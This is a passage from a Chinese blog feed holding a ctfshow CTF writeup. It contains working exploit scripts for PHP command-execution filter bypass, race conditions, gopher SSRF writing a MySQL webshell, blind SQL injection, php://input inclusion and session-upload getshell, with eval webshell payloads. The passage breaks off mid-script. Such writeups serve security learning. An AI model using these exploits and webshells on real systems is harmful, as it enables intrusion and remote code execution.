1b7b6adee4a0f1a5b27b0c4c94656c6bfeacf68c6f660f77d99044937ed64ecd1280c46936af06500397cbcc5527da5dfd9143c2fbbdae1f60d33b9d08397c7547c0d78084131689a4d649795cf310079563340acb0a3c75e5f1f0b3c9d6f0bd3adffef15d1313bd8cb3c03f5f6678f477f59bac6573e974dfe1c15bc29be874b9188947573db307a4588d877a5bcff1eef9c875f3cb22bd9787636a39170257e69208327b149dff9025f7af4aaebc899b9d9e65d452ffc1d4313c3e2fafef6fadd2023de3f62f194287771af4747d61c798077e1495a0edff55913732f656e837dc8bea28be8b6b627590e9f712232631c2799cbfa55fdd889493fda55c2402a02f3e782dc37a81516042b64c87b25dced97234332d0665458e5d1647fcf2971aa9a6e7f2846b124e1e4a8192216263fe7cc9676292e55e232f34d5e03f9f1ba7dc683dcb6d2aef2042bc8b94be45091253d07f95d1786da129ebabfb47db502b4ea6f94cff58bd58f97a2a594d24353200a8836aff23590ba6612879bc2d6b325c292185a3b6e853d3323ff1bdc890df255eab45205ed4e3f181d0194233589496284b7b42c7f048d42ca330d0061e4c1eaa741f89f006c4ee22ef27472517951d459908eb7f419b1c8694ab58eb259b689732685fa48952e7be987d44f00abfb3793d3387ff9fc3a223346be6019ca2a52c57f64fb375e1b4114dbc679a7ee4d92741a6c84a715ca325767d868ddd5282b008526ab9f041c0d2b79e72663792570968fdf8caad50f538b7b7ad180e5939281fc7244f18245cb2fc2b99f5a32ab2c79a70975caef423d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow部分题目writeup</title>
      <link href="2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/"/>
      <url>2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了ctfshow上部分题目的writeup！</p><a id="more"></a><h2 id="红包题"><a href="#红包题" class="headerlink" title="红包题"></a>红包题</h2><h3 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h3><p>查看源代码，发现hint，访问发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    $cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,$cmd))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,$cmd))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我第一次想到的是php正则回溯，然而不是，不绕弯子</p><p>过滤了好多东西，但发现<code>./&lt;&gt;?p</code>以及反引号并没有过滤，这里就要介绍一个概念php临时文件</p><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的<code>upload_tmp_dir</code>属性指定</p><p>在上传存储到临时目录后，临时文件命名的规则：默认为 php+4或者6位随机数字和大小写字母</p><p>因此我们就可以尝试上传一个文件，然后绕过用通配符和短标签来执行该文件，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;&#x27;</span><span class="comment">#加号用来分隔也可以用空格，短标签的后半部分可以不加</span></span><br><span class="line">url=<span class="string">&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">files=&#123;</span><br><span class="line"><span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;#!/bin/sh\necho 1433223\nls /\ncat /flag.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">r=requests.get(url1)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;1433223&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">threading.Thread(target=post,args=()).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">threading.Thread(target=req,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h3><p>hint提示不是sql注入，要找源码，dirsearch扫目录发现</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200217222027.png"><p><code>www.zip</code>里有<code>check.php</code>的关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params">$receiveFile</span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    $streamData = <span class="keyword">isset</span>($GLOBALS[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? $GLOBALS[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($streamData))&#123;</span><br><span class="line">        $streamData = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>($streamData!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        $ret = file_put_contents($receiveFile, $streamData, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $ret = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $ret;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5(date(<span class="string">&quot;i&quot;</span>)) === $token)&#123;</span><br><span class="line"></span><br><span class="line">$receiveFile = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">receiveStreamFile($receiveFile);</span><br><span class="line"><span class="keyword">if</span>(md5_file($receiveFile)===md5_file(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(hash_file(<span class="string">&quot;sha512&quot;</span>,$receiveFile)!=hash_file(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">$ret[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">$ret[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ret[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ret[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$ret[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>查看<code>key.dat</code>发现明显是用<code>fastcoll</code>生成的，但题目并不是这种思路</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200217222354.png" style="zoom:80%;"><p>介绍一下<code>fastcoll</code>，工具可以用来生成两个MD5值相同但内容不相同的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure><p>-p 是源文件, -o 是输出文件(两个)，同样我们也可以用工具生成四个MD5相同但内容不同的文件</p><p>先生成两个MD5相同但内容不同的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o 1.txt 2.txt</span><br></pre></td></tr></table></figure><p>取其中一个文件作为源文件再生成两个MD5相同但内容不同的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p 1.txt -o 3.txt 4.txt</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM%E6%88%AA%E5%9B%BE20200217223957.png"></p><p>可以看到<code>1.txt</code> <code>2.txt</code>是128字节，而<code>3.txt</code> <code>4.txt</code>是256字节，因此我们只需要将<code>3.txt</code>,<code>4.txt</code>文件后128字节取出来放在<code>2.txt</code>后面，便可以有四个MD5相同内容不相同的文件</p><p>取出可以用<code>tail</code>,下载连接：<a href="https://www.trisunsoft.com/tail-for-windows.htm">https://www.trisunsoft.com/tail-for-windows.htm</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail.exe -c 128 3.txt &gt; a</span><br><span class="line">tail.exe -c 128 4.txt &gt; b</span><br></pre></td></tr></table></figure><p>合成可用win自带的type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type 2.txt a &gt; 5.txt</span><br><span class="line">type 2.txt b &gt; 6.txt</span><br></pre></td></tr></table></figure><p>当然也可以用hxd</p><p>再说本题 ，题目考察的是条件竞争，即我们只需满足第一个MD5比较之后然后更改文件内容即可，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">data</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">mi=str(time.localtime().tm_min)</span><br><span class="line">m=hashlib.md5(mi.encode()).hexdigest()</span><br><span class="line">url=<span class="string">&#x27;http://124.156.121.112:28047/check.php?token=&#123;&#125;&amp;php://input&#x27;</span>.format(m)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;key.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1=f.read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;nokey.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">threading.Thread(target=post,args=(data1,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">threading.Thread(target=post,args=(data2,)).start()</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://xz.aliyun.com/t/2232">https://xz.aliyun.com/t/2232</a></p><h3 id="红包题第九弹"><a href="#红包题第九弹" class="headerlink" title="红包题第九弹"></a>红包题第九弹</h3><p>很明显是ssrf gopher://协议攻击mysql，试了很久，都没成功，还是tcl，最重要的url编码忘记了，我TM</p><p>下面介绍三种方式生成payload:</p><h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p><strong>准备工作：</strong></p><p>mysql设置无密码，我这里用的是kali2019.3</p><p>直接在配置文件<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code>里的<code>[mysqld]</code>下面增加一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure><p>重启mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>不行就</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/mysql/mysql.server stop</span><br><span class="line">/usr/share/mysql/mysql.server start</span><br></pre></td></tr></table></figure><p><code>/var/www/html</code>有写权限，其实这个无所谓，抓的只是流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure><p>tcpdump监听lo网卡3306端口流量，保存在文件里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 3306 -w mysql.pacp</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h 127.0.0.1</span><br></pre></td></tr></table></figure><p>在sql命令行执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;/var/www/html/moonback.php&quot;</span>;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后wireshark打开，追踪tcp流</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200412231849.png" style="zoom:80%;"><p>选择原始数据，保存到一个文件，hxd打开把16进制复制到txt中，然后空格替换%号，别忘了第一个增加%</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200412232521.png" style="zoom:80%;"><p>然后就可以发送给服务端了，注意要url编码一次</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200412232835.png" style="zoom:80%;"><h4 id="common-gopher-tcp-stream"><a href="#common-gopher-tcp-stream" class="headerlink" title="common-gopher-tcp-stream"></a>common-gopher-tcp-stream</h4><p>github地址：<a href="https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream">https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream</a></p><p>这个工具直接把编码后的显示出来了，很方便</p><p>下载下来首先make编译一下</p><p>然后监听,端口和-p必须挨着</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sniffer -p3306</span><br></pre></td></tr></table></figure><p>接着和上面一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h 127.0.0.1</span><br><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> into outfile <span class="string">&quot;/var/www/html/moonback.php&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200412233442.png" style="zoom:80%;"><p>然后提交的时候注意url再编码一次就行</p><p>仔细看了看发现除了大小写，两个流量没啥差别，都是16进制，大小写无所谓</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200412233705.png" style="zoom:80%;"><h4 id="Gopherus"><a href="#Gopherus" class="headerlink" title="Gopherus"></a>Gopherus</h4><p>github地址：<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>直接用工具生成也行，注意<strong>url编码</strong>,我真垃圾</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM截图20200412234619.png" style="zoom:80%;"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>布尔盲注，没啥过滤，直接跑，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://783dfdd8-9d2e-4e68-b3df-e1b718d4a572.chall.ctf.show/&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.post(url,data=data1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>allow_url_fopen和allow_url_include都开启了，直接<code>php://input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST:</span><br><span class="line">&lt;?php system(&#39;cat ctf_go_go_go &#39;);</span><br></pre></td></tr></table></figure><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>过滤了php，直接session_upload_progress GETshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=mb&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#上传无效的空文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27;</span>     <span class="comment">#恶意进度信息，readfile将直接输出文件内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST()</span><br><span class="line">        t=r.get(<span class="string">&quot;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/?url=/tmp/sess_mb&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&#x27;[+] ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($v1) &amp;&amp; <span class="keyword">isset</span>($v2))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctype_alpha($v1))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($v1)==md5($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5弱比较，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</span><br></pre></td></tr></table></figure><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>就比web2多过滤个空格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 